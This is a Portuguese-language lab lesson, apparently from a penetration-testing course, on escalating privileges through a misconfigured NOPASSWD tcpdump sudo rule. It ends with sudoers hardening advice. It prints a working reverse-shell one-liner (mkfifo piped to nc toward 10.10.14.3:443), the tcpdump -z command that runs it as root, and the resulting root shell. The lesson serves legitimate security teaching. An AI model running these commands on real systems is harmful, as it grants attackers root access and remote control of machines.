Privilégios sudo podem ser concedidos a uma conta, permitindo que a conta execute certos comandos no contexto do root (ou outra conta) sem ter que alterar usuários ou conceder privilégios excessivos.

Quando o comando `sudo` é emitido, o sistema verificará se o usuário que emitiu o comando tem os direitos apropriados, conforme configurado em `/etc/sudoers`.

Ao acessar um sistema, devemos sempre verificar se o usuário atual tem privilégios sudo digitando `sudo -l`. Às vezes, precisaremos saber a senha do usuário para listar seus direitos `sudo`, mas quaisquer entradas de direitos com a `NOPASSWD`opção podem ser vistas sem inserir uma senha.

```sh
sudo -l
```

É fácil configurar isso incorretamente. Por exemplo, um usuário pode receber permissões de nível root sem exigir uma senha. Ou a linha de comando permitida pode ser especificada de forma muito frouxa, permitindo que executemos um programa de forma não intencional, resultando em escalonamento de privilégios.

Por exemplo, se o arquivo sudoers for editado para conceder a um usuário o direito de executar um comando, como `tcpdump`na seguinte entrada no arquivo sudoers: `(ALL) NOPASSWD: /usr/sbin/tcpdump`um invasor pode aproveitar isso para tirar vantagem da opção **postrotate-command** .

```sh
man tcpdump

<SNIP> 
-z postrorate-command              

Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```

Ao especificar o sinalizador `-z`, um invasor pode usar o `tcpdump` para executar um script de shell, obter um shell reverso como usuário root ou executar outros comandos privilegiados. Por exemplo, um invasor pode criar o script de shell `.test` contendo um shell reverso e executá-lo da seguinte forma:

```shell-session
htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Vamos tentar isso. Primeiro, faça um arquivo para executar com o `postrotate-command`, adicionando um shell reverso simples de uma linha.

```shell-session
htb_student@NIX02:~$ cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

Em seguida, inicie um `netcat`listener em nossa caixa de ataque e execute `tcpdump`como root com o `postrotate-command`. Se tudo correr conforme o planejado, receberemos uma conexão shell reversa root.

```shell-session
htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Recebemos um shell de root quase instantaneamente.

```shell-session
NycolasES6@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```

[O AppArmor](https://wiki.ubuntu.com/AppArmor) em distribuições mais recentes predefiniu os comandos usados ​​com o `postrotate-command`, efetivamente impedindo a execução do comando. Duas práticas recomendadas que devem sempre ser consideradas ao provisionar direitos `sudo`:

|   |   |
|---|---|
|1.|Sempre especifique o caminho absoluto para quaisquer binários listados na `sudoers`entrada do arquivo. Caso contrário, um invasor pode ser capaz de alavancar o abuso de PATH (que veremos na próxima seção) para criar um binário malicioso que será executado quando o comando for executado (ou seja, se a `sudoers`entrada especificar `cat`em vez `/bin/cat`disso, provavelmente poderá ser abusado).|
|2.|Conceda `sudo`direitos com moderação e com base no princípio do menor privilégio. O usuário precisa `sudo`de direitos totais? Ele ainda pode executar seu trabalho com uma ou duas entradas no `sudoers`arquivo? Limitar o comando privilegiado que um usuário pode executar reduzirá muito a probabilidade de escalonamento de privilégios bem-sucedido.|
















































